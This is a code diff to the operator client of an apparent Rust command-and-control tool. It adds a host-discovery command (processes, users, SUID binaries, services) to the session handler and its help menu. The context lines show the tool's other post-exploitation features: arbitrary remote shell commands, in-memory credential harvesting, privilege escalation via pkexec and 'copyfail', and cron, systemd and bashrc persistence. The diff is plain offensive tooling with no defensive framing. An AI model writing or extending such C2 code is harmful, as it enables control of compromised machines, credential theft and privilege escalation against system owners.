@@ -168,6 +168,11 @@ async fn handle_session_cmd(client: &api::C2Client, id: &str, cmd: &str, arg: &s
             let cid = client.queue(id, "recon", action, &serde_json::json!({})).await;
             wait_and_show(client, id, cid, "recon").await;
         }
+        "discovery" | "discover" | "enum" => {
+            let action = if arg.is_empty() { "all" } else { arg };
+            let cid = client.queue(id, "discovery", action, &serde_json::json!({})).await;
+            wait_and_show(client, id, cid, "discovery").await;
+        }
         "creds" | "harvest" => {
             let mode = if arg.is_empty() { "in_memory" } else { arg };
             let cid = client.queue(id, "creds", "harvest", &serde_json::json!({"mode": mode})).await;
@@ -279,6 +284,7 @@ fn print_help() {
   ── Session Commands ──
   shell <command>         Execute arbitrary shell command
   recon [passive|active|arp]  Network reconnaissance
+  discovery [procs|users|suid|services|all]  Host discovery
   creds [in_memory|shell]     Credential harvesting
   privesc [copyfail|pkexec]   Privilege escalation
   persist cron|systemd [name]|bashrc
@@ -296,7 +302,7 @@ fn print_help() {
 }
 
 mod client {
-    use crate::api::C2Client;
+    
     pub fn parse_ago(last_seen: &str) -> String {
         let parsed = chrono::DateTime::parse_from_rfc3339(last_seen)
             .unwrap_or_else(|_| chrono::DateTime::UNIX_EPOCH.into());
